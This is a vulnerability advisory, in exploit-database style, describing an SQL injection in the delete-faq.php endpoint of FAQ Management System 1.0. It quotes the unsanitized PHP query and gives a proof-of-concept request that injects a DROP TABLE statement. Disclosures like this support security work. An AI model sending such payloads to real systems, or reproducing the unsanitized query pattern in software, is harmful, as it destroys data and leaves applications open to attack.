---
title: FAQ Management System 1.0 SQL Injection
published: true
---

- Exploit Title: FAQ Management System - SQL Injection
- Google Dork: N/A
- Application: FAQ Management System
- Date: 25.02.2024
- Bugs: SQL Injection
- Exploit Author: SoSPiro
- Vendor Homepage: https://www.sourcecodester.com/
- Software Link: https://www.sourcecodester.com/php/17175/faq-management-system-using-php-and-mysql-source-code.html
- Version: 1.0
- Tested on: Windows 10 64 bit Wampserver
- CVE : N/A

***

### Vulnerability Description:

The provided code is vulnerable to SQL injection. The vulnerability arises from directly using user input `($_GET['faq'])` in the SQL query without proper validation or sanitization. An attacker can manipulate the 'faq' parameter to inject malicious SQL code, leading to unintended and potentially harmful database operations.


### Proof of Concept (PoC):

An attacker can manipulate the 'faq' parameter to perform SQL injection. For example:

1. Original Request:

`http://example.com/endpoint/delete-faq.php?faq=123`

2. Malicious Request (SQL Injection):

```
http://example.com/endpoint/delete-faq.php?faq=123'; DROP TABLE tbl_faq; --
```

This would result in a query like:

```sql
DELETE FROM tbl_faq WHERE tbl_faq_id = '123'; DROP TABLE tbl_faq; --
```
Which can lead to the deletion of data or even the entire table.


[poc foto](https://i.imgur.com/1IENYFg.png)

### Vulnerable code section:

***
`endpoint/delete-faq.php`

```php
$faq = $_GET['faq'];

// ...

$query = "DELETE FROM tbl_faq WHERE tbl_faq_id = '$faq'";
```